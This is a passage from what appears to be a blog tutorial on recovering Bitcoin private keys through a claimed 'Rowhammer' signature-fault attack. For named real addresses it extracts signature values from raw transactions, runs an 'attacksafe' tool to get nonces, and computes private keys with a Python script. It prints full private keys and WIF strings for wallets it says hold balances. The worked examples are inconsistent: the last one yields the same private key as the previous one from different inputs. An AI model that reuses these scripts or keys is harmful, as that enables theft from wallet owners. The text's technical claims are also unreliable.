<p><code>K = 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x5cdc6820f6336951f2d9f55b544ed2337804ddaa38249f53e7fc7b176ae67a2a
R = 0xcb620734c986b2f5ef6d3dbaa72baec6ceb153590553d15c28f57fc809e0c368
S = 0x5b4f85e04379ca7fc4d48bbf4ed5a204eba9459bcfe042c4fb10f13c76fe8720
Z = 0x5a6c8e71ff1d29ebf721320d373808f66ede9303e09e3715b3e85ce57b92b7c8


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-177.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1330"></figure>



<p><code>PrivKey = e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc
WIF:  L54WQgCucvc7HCQvYSKnKgiqMUXXXvPxEYZbpxFWTeqQQTuAsqhH
HEX:  e9f6fc4dea68373f7e91348a23086d406621c1af6b7c0f085fb3096f5ae6b5cf</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/004.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1332"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-179-1024x452.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1337"><figcaption><strong><a href="https://www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/17xFf85Y8YGsRsgSjCN4KfBKXTjpSnDBxc</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 679.53</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№5</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37</a></p><p><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-105-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1148"></figure>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-106-1024x203.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1150"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/d415bede55c2a598487d708bd2a6e6c2e616eb8db3de844f7ad0298871c13c37</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-185-1024x97.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1349"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-186-1024x240.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1351"></figure>



<pre class="wp-block-code"><code>R = 0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
S = 0x0cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f65274340
Z = 0x6b709c60c5357b397ed916dd014b7ce92ead05508b173b45f20066d23c6720f6</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-187-1024x294.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1353"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-188-1024x395.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1354"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be

RawTX = 010000000179b9169d7436b95206053986e843b69d8e8235933a126e597c2dd7cdc6a07ed8060000006b483045022100c5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd93502200cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f652743400121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-189-1024x89.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1356"></figure>



<p><code>(0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935 , 0xb05023fec1068addab6d25f08d358e6f25edd83094ac730dcb7124ef3f662af7)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
S = 0x0cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f65274340
Z = 0x6b709c60c5357b397ed916dd014b7ce92ead05508b173b45f20066d23c6720f6</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
point2gen  =   (0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935 , 0xb05023fec1068addab6d25f08d358e6f25edd83094ac730dcb7124ef3f662af7)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf8be8b1e7110c61a6904bb3eb3834c08ee1f18c56b6a04915e14306c1a8668be
R = 0xc5c2d551da92885687072c21288451cac237778ccad971dba929cedbb57fd935
S = 0x0cc3cfec36e8e9df751438ea3486d868f1ce6fb4b05540fe724b8e8f65274340
Z = 0x6b709c60c5357b397ed916dd014b7ce92ead05508b173b45f20066d23c6720f6


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-190.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1358"></figure>



<p><code>PrivKey = f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18vXv21kk8PfN4KRX5i19QvDRM855qheQ
WIF:  L5UYkyYNJDaJTrTZdgWUjPBx1EdgSCjoqxLdqgnQvmcAqMVZnQUh
HEX:  f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/005.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1360"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-191-1024x450.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1363"><figcaption><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 683.49</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc1.trezor.io/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p><p><a href="https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/tx/15002f0dc4d2b3f747da8f24a2b994fd86d47db29f682204929c66d7bd52cd42</a></p></blockquote>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-192-1024x93.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1366"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000
</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-193-1024x239.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1367"></figure>



<pre class="wp-block-code"><code>R = 0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
S = 0x5fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c71
Z = 0xed1d33e82c50d2e9567cee7c1bda9ebee64509fb0575bf144779f81dd1dbf42c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool rowhammer_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool rowhammer_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-195-1024x297.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1369"></figure>



<p>We launched this attack from&nbsp;<code>-tool rowhammer_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-194-1024x440.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1368"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d

RawTX = 0100000001b62152613231593ee2dc4b588240cc0ec67c4a20c9467a235781104b9da2e60c170000006a4730440220340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a02205fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c710121024feffc562717f5780235775c775d79b278d74dad2ec8032c4a138c6177693c99ffffffff0126020000000000001976a914274b3b849e8e46c918657bff191c2df0a1db8ba988ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-196-1024x86.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1371"></figure>



<p><code>(0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a , 0x86fe84a8fe36d81088a807db2ff8e7b810cf0104118c527bc06d36dd1688befd)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
S = 0x5fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c71
Z = 0xed1d33e82c50d2e9567cee7c1bda9ebee64509fb0575bf144779f81dd1dbf42c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
point2gen  =   (0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a , 0x86fe84a8fe36d81088a807db2ff8e7b810cf0104118c527bc06d36dd1688befd)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>18vXv21kk8PfN4KRX5i19QvDRM855qheQ</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xc740256813f9d1db22418516a73adbe62dbe9ce20f0c2254c40d649d6d1acc4d
R = 0x340e28901b7b518b09b59cc30df0b03057b2a63e360495d391de2ea51f5b3b2a
S = 0x5fe8c05bfb82b89e534b027659ec0231b64b41397b48f5983bf461b9c2c72c71
Z = 0xed1d33e82c50d2e9567cee7c1bda9ebee64509fb0575bf144779f81dd1dbf42c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/image-190.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1358"></figure>



<p><code>PrivKey = f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 18vXv21kk8PfN4KRX5i19QvDRM855qheQ
WIF:  L5UYkyYNJDaJTrTZdgWUjPBx1EdgSCjoqxLdqgnQvmcAqMVZnQUh
HEX:  f655071bf6c91cc8ce7ec7c7ece17e3aa6027762dd9c59bfd0889fd1817fb566</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/005.png" alt="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)" class="wp-image-1360"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-text-align-center"><strong><a href="https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ" target="_blank" rel="noreferrer noopener">https://www.blockchain.com/btc/address/18vXv21kk8PfN4KRX5i19QvDRM855qheQ</a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private key Found!</code></p>



